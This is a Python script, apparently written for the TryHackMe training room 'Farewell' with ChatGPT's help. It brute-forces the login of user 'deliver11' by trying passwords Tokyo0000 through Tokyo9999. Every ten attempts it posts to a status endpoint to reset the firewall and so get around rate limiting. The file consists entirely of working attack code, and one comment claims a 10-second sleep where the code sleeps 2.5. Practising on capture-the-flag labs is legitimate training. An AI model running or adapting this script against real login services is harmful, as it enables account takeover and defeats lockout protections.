# script used on TryHackMe room Farewell https://tryhackme.com/room/farewell
# script with assistane of ChatGPT

import requests
import time
from requests.exceptions import RequestException

BASE = "http://10.10.196.145"
USERNAME = "deliver11"

session = requests.Session()
session.headers.update({
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Origin": BASE,
})

def init_session():
    # Get PHPSESSID like a normal browser
    r = session.get(BASE + "/", headers={"Referer": BASE + "/"})
    print("[*] GET / status:", r.status_code)
    print("[*] Cookies:", session.cookies.get_dict())

def reset_firewall():
    print("[*] Sleeping 10s before firewall reset...")
    time.sleep(2.5)  # a little extra to be safe
    print("[*] Resetting firewall via /status.php ...")
    try:
        r = session.post(
            BASE + "/status.php",
            data={"restart": ""},
            timeout=5,
            headers={"Referer": BASE + "/status.php"}
        )
        print(f"[*] /status.php reset status: {r.status_code}")
    except RequestException as e:
        print(f"[!] Error resetting firewall: {e}")
    # Get a fresh page after reset (like going back to main page)
    init_session()

def try_login(password):
    try:
        r = session.post(
            BASE + "/auth.php",
            data={"username": USERNAME, "password": password},
            timeout=5,
            headers={"Referer": BASE + "/"}
        )
        # /auth.php normally returns JSON
        return r.json()
    except Exception as e:
        # If this happens a lot, uncomment the next line to debug:
        # print("[DEBUG] Raw response:", r.text[:200])
        print(f"[!] Error or non-JSON for {password}: {e}")
        return None

def main():
    init_session()

    # If you already tested some manually, change start_index
    start_index = 0
    end_index = 10000  # Tokyo0000 .. Tokyo9999

    attempts_in_round = 0

    for i in range(start_index, end_index):
        pwd = f"Tokyo{i:04d}"
        print(f"[+] Trying {USERNAME}:{pwd}")

        data = try_login(pwd)

        if data and data.get("success"):
            print(f"[!!!] SUCCESS: {USERNAME}:{pwd}")
            print("[!] Full JSON:", data)
            break

        attempts_in_round += 1

        # After 10 attempts, reset firewall and start a new round
        if attempts_in_round >= 10:
            print("[*] 10 attempts done, resetting firewall...")
            reset_firewall()
            attempts_in_round = 0  # new round

if __name__ == "__main__":
    main()
